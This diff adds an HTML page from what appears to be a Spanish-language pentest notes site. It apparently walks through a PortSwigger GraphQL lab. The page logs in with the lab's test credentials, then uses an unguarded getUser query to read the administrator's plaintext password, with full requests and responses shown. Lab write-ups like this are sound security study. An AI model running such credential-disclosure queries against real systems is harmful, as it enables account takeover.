@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>M0B notes</title>
+  <meta name="description" content="&lt;p&gt;request```json    mutation login($input: LoginInput!) {        login(input: $input) {            token            success        }    }&lt;/p&gt;">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="icon" href="/M0B.png" type="image/png">
+  <style>
+    /* fallback si la hoja no carga */
+    body{background:#000;color:#e6e6e6;font:16px/1.7 ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace}
+  </style>
+  
+  <script defer src="/assets/js/copy-code.js"></script>
+</head>
+<body>
+  <header class="site-header">
+    <div class="site-brand">
+      <img class="brand-logo" src="/M0B.png" alt="logo" />
+      <div class="brand-title">M0B notes</div>
+    </div>
+    <nav class="site-nav">
+      <a href="/">Inicio</a>
+      <a href="/puertos/">Puertos</a>
+      <a href="/escalada/">Escalada</a>
+      <a href="/portswigger/">Portswigger</a>
+      <a href="/hackthebox/">HackTheBox</a>
+      <a href="/real_life/">Real Life</a>
+      <a href="/extras/">Extras</a>
+    </nav>
+  </header>
+
+  <main>
+    <div class="container">
+      <p>request</p>
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">    </span><span class="err">mutation</span><span class="w"> </span><span class="err">login($input:</span><span class="w"> </span><span class="err">LoginInput!)</span><span class="w"> </span><span class="p">{</span><span class="w">
+        </span><span class="err">login(input:</span><span class="w"> </span><span class="err">$input)</span><span class="w"> </span><span class="p">{</span><span class="w">
+            </span><span class="err">token</span><span class="w">
+            </span><span class="err">success</span><span class="w">
+        </span><span class="p">}</span><span class="w">
+    </span><span class="p">}</span><span class="w">
+
+</span><span class="p">{</span><span class="nl">"input"</span><span class="p">:{</span><span class="w">
+	</span><span class="nl">"username"</span><span class="p">:</span><span class="s2">"wiener"</span><span class="p">,</span><span class="w">
+	</span><span class="nl">"password"</span><span class="p">:</span><span class="s2">"peter"</span><span class="w">
+	</span><span class="p">}</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p>response</p>
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+  </span><span class="nl">"data"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="nl">"login"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+      </span><span class="nl">"token"</span><span class="p">:</span><span class="w"> </span><span class="s2">"PKlPc6qrV9uMQyAcgwLqmGLfrujxFaEo"</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"success"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
+    </span><span class="p">}</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Buscamos y vemos que hay una query que nos permite obtener información del administrador:</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">query</span><span class="p">{</span><span class="w">
+	</span><span class="err">getUser(id:</span><span class="w"> </span><span class="mi">1</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+			</span><span class="err">id</span><span class="w">
+			</span><span class="err">username</span><span class="w">
+			</span><span class="err">password</span><span class="w">
+	</span><span class="p">}</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="nl">"query"</span><span class="p">:</span><span class="s2">"query{</span><span class="se">\n\t</span><span class="s2">getUser(id: 1) {</span><span class="se">\r\n\t\t\t</span><span class="s2">id</span><span class="se">\n\t\t\t</span><span class="s2">username</span><span class="se">\n\t\t\t</span><span class="s2">password</span><span class="se">\r\n\t</span><span class="s2">}</span><span class="se">\n</span><span class="s2">}"</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p>respuesta:</p>
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+  </span><span class="nl">"data"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="nl">"getUser"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+      </span><span class="nl">"id"</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"username"</span><span class="p">:</span><span class="w"> </span><span class="s2">"administrator"</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"password"</span><span class="p">:</span><span class="w"> </span><span class="s2">"psqgud000ux6d78ttmbq"</span><span class="w">
+    </span><span class="p">}</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+      <div class="footer">
+        <span class="muted">© 2025 · Generado con Jekyll</span>
+      </div>
+    </div>
+  </main>
+</body>
+</html>
+
